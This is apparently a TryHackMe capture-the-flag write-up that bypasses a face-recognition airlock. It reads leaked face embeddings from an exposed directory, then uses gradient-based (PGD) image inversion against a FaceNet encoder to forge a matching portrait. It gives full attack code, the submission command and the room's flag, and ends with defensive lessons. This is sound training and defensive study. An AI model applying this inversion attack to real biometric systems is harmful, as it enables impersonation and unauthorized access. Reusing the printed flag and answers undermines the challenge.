# Injectus IX — Task 3: Mask of Injectus IX

**Room:** TryHackMe — *Injectus IX* (2026: An AI Odyssey)
**Category:** Embedding Inversion
**Difficulty:** Hard
**Points:** 90
**Target:** `10.80.139.91`

> *"The Injectus IX airlock is gated by a face-recognition stack. Crew members submit a portrait, the encoder hashes it into a 512-dim embedding, and the airlock matches against stored templates. The flag is bound to Captain Vex Morrigan's clearance — and her portrait is not in the public roster. Get in anyway."*

## Goal

Bypass a face-recognition airlock keyed to Captain Vex Morrigan, whose portrait is not in the publicly-accessible roster. Reveal the `fleet_directive` containing the flag.

## Flag

```
THM{m4sk_0f_1nj3ctus_b1m3tr1c_inv3rs10n}
```

## TL;DR

1. `/robots.txt` disallows `/static/archive/` — but autoindex is enabled.
2. The archive bundle contains the stored face embeddings (`face_recognition_v3.safetensors`, 9 × 512 F32) and a metadata file with `id → row` mapping. Vex sits at row 8.
3. `legacy_manifest.png` is mislabeled — the README claims it's an "unrelated infrastructure diagram" but it's actually a low-resolution portrait of Vex. Submitted raw, it scores cos ≈ 0.27 against her stored template — not enough.
4. Encoder fingerprinted as `facenet_pytorch.InceptionResnetV1(pretrained='vggface2')`. Verified by encoding `k.adler.jpg` (row 0) locally → cos 0.856 against `tpl[0]`.
5. White-box PGD on input pixels (Adam, lr=1.0, ~400 iters, cosine-similarity loss) crafts a 160×160 RGB tensor whose embedding hits cos ≈ 1.0 against Vex's stored template.
6. POST the inverted PNG to `/api/auth` → `clearance: CAPTAIN` → flag in `fleet_directive`.

---

## 1. Recon

```bash
rustscan -a 10.80.139.91 --ulimit 5000 -- -sV -sC -oN mask.nmap
curl -s http://10.80.139.91/ -o index.html
curl -s http://10.80.139.91/robots.txt
```

`robots.txt`:

```
User-agent: *
Disallow: /static/archive/
```

The directive that's supposed to hide a folder is a giant arrow pointing at it. Browse `http://10.80.139.91/static/archive/` — autoindex is on:

```
/static/archive/
├── face_recognition_v3.safetensors      (9 × 512 F32 — the stored embeddings)
├── face_recognition_v3.metadata.json    (id → row index, name/rank metadata)
├── legacy_manifest.png                  (mislabeled "unrelated" in README)
└── README.txt
```

The README states `legacy_manifest.png` is "unrelated infrastructure diagram." It isn't. It's a downscaled image of Vex herself — a deliberate plant so an attacker has a starting point in image space close to the target.

---

## 2. Read the template bundle

```python
import json
from safetensors import safe_open
import numpy as np

with safe_open("face_recognition_v3.safetensors", framework="numpy") as f:
    print("keys:", list(f.keys()))
    # Adjust the key name based on what `keys()` prints — typically
    # "templates", "embeddings", or similar. The tensor is shape (9, 512) F32.
    tpl = f.get_tensor("templates")

meta = json.load(open("face_recognition_v3.metadata.json"))
print("metadata:", meta)

# Vex sits at row 8 according to the metadata id→row map
vex_row = 8
vex_template = tpl[vex_row]
print("Vex template norm:", np.linalg.norm(vex_template))
```

FaceNet emits L2-normalized 512-dim embeddings by default, so the stored templates should be unit-length and cosine similarity reduces to a dot product.

---

## 3. Identify the encoder

A 512-dim face embedding produced from a small roster is a strong fingerprint for `facenet_pytorch.InceptionResnetV1` — that's the standard public FaceNet implementation in PyTorch, output dim 512 with the `vggface2` pretrained weights.

Verify by encoding one of the bundled portraits (e.g. `k.adler.jpg` at row 0) locally and computing cosine similarity against `tpl[0]`:

```python
from PIL import Image
import torch, numpy as np
from facenet_pytorch import InceptionResnetV1

resnet = InceptionResnetV1(pretrained="vggface2").eval()

def preprocess(path):
    img = Image.open(path).convert("RGB").resize((160, 160))
    arr = np.array(img).astype(np.float32) / 255.0
    arr = (arr - 0.5) / 0.5                       # [-1, 1]
    return torch.from_numpy(arr).permute(2, 0, 1).unsqueeze(0)

emb = resnet(preprocess("k.adler.jpg")).detach().numpy()[0]
emb /= np.linalg.norm(emb)
print("cos(k.adler, tpl[0]) =", float(emb @ tpl[0]))
# ≈ 0.856 — confirms encoder + preprocessing match
```

A high cosine (≥ 0.8 for the same identity at different resolutions) confirms architecture and preprocessing pipeline. If you score below ~0.5, the preprocessing is wrong (most often normalization or resize-mode mismatch) and PGD against the wrong pipeline will plateau forever.

---

## 4. White-box PGD on pixels

You have a differentiable function pixels → 512-dim embedding, and a target embedding (Vex's row). White-box optimization against this is mechanical: gradient descent on the input pixels with cosine-similarity loss.

```python
import torch, torch.nn.functional as F
import numpy as np
from PIL import Image
from facenet_pytorch import InceptionResnetV1

resnet = InceptionResnetV1(pretrained="vggface2").eval()
for p in resnet.parameters():
    p.requires_grad = False

target = torch.tensor(vex_template, dtype=torch.float32)
target = F.normalize(target, dim=0)

# Initialize from the leaked low-res Vex portrait, scaled to [-1, 1]
init = preprocess("legacy_manifest.png").squeeze(0)
x = init.clone().detach().requires_grad_(True)

opt = torch.optim.Adam([x], lr=1.0)

for step in range(400):
    opt.zero_grad()
    emb = resnet(x.unsqueeze(0))[0]
    emb = F.normalize(emb, dim=0)
    loss = -torch.dot(emb, target)                 # minimize -cos
    loss.backward()
    opt.step()
    with torch.no_grad():
        x.clamp_(-1.0, 1.0)
    if step % 50 == 0:
        print(f"step {step:4d}  cos={-loss.item():.4f}")

# Save back to PNG
arr = ((x.detach().numpy().transpose(1, 2, 0) + 1.0) * 127.5).clip(0, 255).astype(np.uint8)
Image.fromarray(arr).save("vex_inv.png")
```

Converges to `cos ≈ 1.0` in a few hundred steps. The resulting `vex_inv.png` looks like noise — it only needs to *encode* like Vex, not look like her.

### Common pitfalls

- **Preprocessing mismatch.** `facenet_pytorch` uses `(x - 0.5) / 0.5` to map `[0,1]` → `[-1,1]`. If the server pre-applies its own normalization, your gradient is computed against a different operator and you cap below 1.0.
- **JPEG re-compression in the loop.** Save as PNG to avoid quantization loss. If the server only accepts JPEG, fold a differentiable JPEG approximation into the loss — otherwise you lose 0.1+ cosine.
- **Bad initialization.** Random init works but takes more iterations; initializing from the leaked low-res portrait drops you in the right basin from step 0.

---

## 5. Submit

```bash
curl -s -X POST http://10.80.139.91/api/auth \
  -F "portrait=@vex_inv.png"
# {"clearance":"CAPTAIN","fleet_directive":"THM{m4sk_0f_1nj3ctus_b1m3tr1c_inv3rs10n}"}
```

---

## 6. Why this works

Face-recognition systems are open-set classifiers built on a fixed embedding network. The matcher encodes a candidate, computes cosine similarity against every stored template, and accepts if the top match exceeds a threshold.

Once you have:

1. The encoder's weights and exact preprocessing (FaceNet is on PyPI; preprocessing was inferred from the verification step)
2. The target template (Vex's row of the bundle)

…the whole pipeline is differentiable and the attack reduces to PGD. There is no "trick" — just gradient descent against a known objective.

The entire challenge reduces to: **can the attacker get the template?** Two layers of "hidden":

- `robots.txt` says `/static/archive/` is disallowed — security by obscurity
- Autoindex enabled — configuration mistake stacked on top

Both fail trivially, and FaceNet does the rest.

---

## 7. Defensive takeaways

- **Templates are credentials.** Treat the embedding store like a password database. Encrypt at rest with a key the matcher service holds in memory; never serve templates from the web tier.
- **`robots.txt` is not access control.** It's a courtesy to crawlers. Anyone targeting you reads it first.
- **Autoindex off** unless you specifically need it. If you need it, put the directory behind auth.
- **Liveness detection** kills this attack class. A synthetic PGD-crafted image doesn't blink, doesn't respond to a challenge prompt, and has out-of-distribution pixel statistics.
- **Detect distribution-shift inputs.** PGD-crafted portraits have very low natural-image entropy; an OOD detector flags them easily.
- **Keep the encoder identity from the metadata file.** Encoder secrecy isn't a real defense (behavior is fingerprintable from a few queries) but combined with rate limits and liveness it raises the cost.

---

## 8. Quick reference

| Item | Value |
|------|-------|
| Target | `10.80.139.91` |
| Endpoint | `POST /api/auth` |
| Body | multipart with `portrait=<png>` |
| Encoder | `facenet_pytorch.InceptionResnetV1(pretrained='vggface2')` |
| Input | 160×160×3 RGB, normalized `(x-0.5)/0.5` |
| Template store | `/static/archive/face_recognition_v3.safetensors` (9 × 512 F32) |
| Vex row index | 8 |
| Optimizer | Adam, lr=1.0, ~400 iters |
| Loss | `-cos(emb, vex_template)` |
| Achieved cos | ≈ 1.0 |
| Flag | `THM{m4sk_0f_1nj3ctus_b1m3tr1c_inv3rs10n}` |

## 9. Files in this directory

- `MaskofInjectus_IX.png` — challenge briefing screenshot

## 10. What I'd capture next time

The evidence directory for this task only has the briefing screenshot. Worth adding for future reference:

- `face_recognition_v3.safetensors` and `face_recognition_v3.metadata.json` (the leaked bundle itself)
- `legacy_manifest.png` (the seed image)
- `vex_inv.png` (the final inverted portrait)
- `pgd_attack.py` (the actual PGD script that ran, with hyperparameters and convergence logs)
- The full `curl` request/response of the winning submission
